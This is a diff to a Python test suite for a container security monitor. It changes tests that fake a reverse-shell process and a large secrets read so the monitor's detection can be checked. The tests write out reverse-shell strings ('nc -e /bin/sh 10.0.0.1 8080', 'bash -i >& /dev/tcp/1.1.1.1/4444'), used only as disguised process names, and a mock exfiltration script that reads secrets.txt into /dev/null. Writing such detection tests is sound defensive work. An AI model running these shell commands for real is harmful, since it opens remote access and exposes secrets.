@@ -654,10 +654,11 @@ print("Task completed")
         # Wait for monitoring baseline to stabilize
         time.sleep(10)
 
-        # Inject the malicious process directly via incus exec (simulates what run_task.py does)
-        # Direct injection ensures the faked process is visible to the monitoring daemon.
-        # Python subprocess within incus exec can be unreliable (subprocess may not survive
-        # when the incus exec session ends), so we inject directly like other shell pattern tests.
+        # Inject the malicious process directly via incus exec (simulates what run_task.py does).
+        # Uses "bash -i >& /dev/tcp/..." pattern which:
+        # - matches the "bash -i" pattern (no isNetworkRelated check needed)
+        # - also contains "/dev/tcp/" which independently matches a reverse shell pattern
+        # This is the same reliable pattern used by test_critical_threat_kills_container.
         exec_proc = subprocess.Popen(
             [
                 "incus",
@@ -666,7 +667,7 @@ print("Task completed")
                 "--",
                 "bash",
                 "-c",
-                "exec -a 'nc -e /bin/sh 10.0.0.1 8080' sleep 60",
+                "exec -a 'bash -i >& /dev/tcp/1.1.1.1/4444' sleep 60",
             ],
             stdout=subprocess.DEVNULL,
             stderr=subprocess.DEVNULL,
@@ -780,53 +781,32 @@ class TestHighLevelThreats:
         # Create 100MB file (exceeds default threshold)
         large_file.write_text("SECRET_DATA\n" * 10_000_000)
 
-        # Create script that generates actual block I/O (not page-cache hits)
-        # CRITICAL: Must spread I/O over 15-20 seconds (15-20 monitoring polls at 1s interval)
-        # to accumulate deltas > 50MB threshold.
-        #
-        # Why not read /workspace/secrets.txt directly:
-        # The workspace is a bind mount from the host. Reads are served from the shared OS
-        # page cache → cgroup block I/O counter stays at zero → threshold never crossed.
-        #
-        # Fix: create a fresh file on the container's OWN btrfs filesystem (/tmp/exfil_data.bin),
-        # then use posix_fadvise(DONTNEED) to evict pages, so subsequent reads hit the block
-        # device and increment the cgroup rbytes counter.
+        # Create script that generates actual block I/O using dd with iflag=direct.
+        # Regular Python open() reads are served from the OS page cache (shared between
+        # host and bind-mounted workspace) → cgroup block I/O counter stays at zero.
+        # dd iflag=direct uses O_DIRECT which bypasses the page cache, ensuring reads
+        # are counted in cgroup rbytes. This is the same approach used by the passing
+        # test_file_read_at_threshold_triggers and test_file_read_above_threshold_triggers.
         exfil_script = Path(test_workspace) / "exfiltrate.py"
         exfil_script.write_text(
             """#!/usr/bin/env python3
-import os
+import subprocess
 import time
 
-# Simulate data exfiltration: create a large file on the container's own filesystem
-# (not /workspace which is a shared bind mount with page-cached data)
-file_path = '/tmp/exfil_data.bin'
-chunk_size = 5 * 1024 * 1024  # 5MB chunks
-
-# Write 120MB to the container's own btrfs filesystem
-with open(file_path, 'wb') as f:
-    for _ in range(24):  # 24 * 5MB = 120MB
-        f.write(b'A' * chunk_size)
-
-# Advise kernel to drop pages from cache so reads generate real block I/O
-file_size = os.path.getsize(file_path)
-try:
-    fd = os.open(file_path, os.O_RDONLY)
-    os.posix_fadvise(fd, 0, file_size, os.POSIX_FADV_DONTNEED)
-    os.close(fd)
-except OSError:
-    pass  # Best effort - reads may still generate I/O on cold cache
-
-# Read in 5MB chunks with 1-second delays = 120MB over ~24 seconds
-total_bytes = 0
-with open(file_path, 'rb') as f:
-    while True:
-        chunk = f.read(chunk_size)
-        if not chunk:
-            break
-        total_bytes += len(chunk)
-        time.sleep(1.0)  # 1 second delay between chunks (one monitoring poll per chunk)
-
-print(f"Read {total_bytes} bytes")
+# Simulate data exfiltration: read secrets.txt with direct I/O to bypass page cache.
+# iflag=direct (O_DIRECT) ensures reads go to the block device and are counted in
+# the container's cgroup I/O stats, which the monitoring daemon tracks.
+result = subprocess.run(
+    ["dd", "if=/workspace/secrets.txt", "of=/dev/null", "bs=1M", "iflag=direct"],
+    capture_output=True,
+)
+print(f"dd exit code: {result.returncode}")
+if result.returncode != 0:
+    # Fallback without direct I/O if filesystem doesn't support it
+    subprocess.run(
+        ["dd", "if=/workspace/secrets.txt", "of=/dev/null", "bs=1M"],
+        capture_output=True,
+    )
 time.sleep(60)
 """
         )
